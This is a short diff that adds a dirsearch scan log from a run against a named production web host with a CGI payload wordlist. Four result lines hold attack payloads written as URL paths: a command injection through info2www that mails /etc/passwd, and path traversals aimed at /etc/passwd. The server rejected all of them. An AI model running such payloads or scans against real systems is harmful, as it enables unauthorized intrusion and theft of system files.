@@ -1,0 +1,6 @@
+# Dirsearch started Mon Aug 19 16:22:17 2024 as: /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u ws-request-prd.plusgrade.com -w /home/zeny/payloads/cgi-files.txt
+
+403   520B   https://ws-request-prd.plusgrade.com/cgi-bin/Intruders.cfg
+400   122B   https://ws-request-prd.plusgrade.com/cgi.cgi/info2www%20'(../../../../../../../bin/mail%20root%20</etc/passwd>
+403   520B   https://ws-request-prd.plusgrade.com/cgi.cgi/mrtg.cfg
+400   122B   https://ws-request-prd.plusgrade.com/cgi.cgi/ssi//../../../../../../../etc/passwd
